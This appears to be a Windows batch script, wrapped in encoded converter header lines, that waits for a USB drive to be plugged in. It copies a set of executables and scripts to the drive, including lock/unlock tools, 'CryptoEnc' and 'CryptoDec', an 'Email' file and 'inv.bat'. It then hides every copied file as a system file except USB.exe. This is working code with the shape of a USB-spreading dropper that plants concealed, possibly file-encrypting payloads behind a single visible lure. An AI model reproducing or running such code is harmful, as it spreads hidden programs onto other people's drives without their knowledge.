::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCGDJH+N+EcDLRhBXg2WJTroVYk64eT+3O+Et18UQPsJKcGL5pKHLOUg70bxZ585zzdpl94eDx5kbQaqYAs1pWFMs1G2Ffuvpw7vTmmF6UU1LnZ2yWbIiUs=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
Title Detecting USB _Path..
::Setlocal enabledelayedexpansion
::set "psCommand="(new-object -COM 'Shell.Application')^
::.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
::for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"

echo System Waiting For Plugin USB Drive...

 
:start
SETLOCAL enableextensions
set "USBCounter=0"
for /F "tokens=2 delims==" %%G in ('
WMIC logicaldisk where "DriveType=2" get DeviceID /value 2^>NUL ^| find "="
') do for /F "tokens=*" %%i in ("%%G") do ( 
set /A "USBCounter+=1"
set Drive=%%i
)
if %USBCounter%==1 goto detect
ENDLOCAL
goto start

:detect
echo.
Title USB Drive Detect Successfully..
echo %Drive%
xcopy standaloneUSBLOCK.bat   %Drive%\ /y
cls
xcopy standaloneUSBLOCK.exe   %Drive%\ /y
cls
xcopy standaloneUSBUNLOCK.bat %Drive%\ /y
cls
xcopy standaloneUSBUNLOCK.exe %Drive%\ /y
cls
xcopy Extenc.exe %Drive%\ /y
cls
xcopy Extdec.exe %Drive%\ /y
cls
xcopy CryptoEnc.exe %Drive%\ /y
cls
xcopy CryptoDec.exe %Drive%\ /y
cls
xcopy url.bat %Drive%\ /y
cls
xcopy USB.exe %Drive%\ /y
cls
xcopy Lockxml.exe %Drive%\ /y
cls
xcopy UnLockxml.exe %Drive%\ /y
cls
xcopy Email %Drive%\ /y
cls
xcopy inv.bat %Drive%\ /y
cls
xcopy RxMl.exe %Drive%\ /y
cls
attrib +h +s %Drive%\*.*
cls
attrib -h -s %Drive%\USB.exe
exit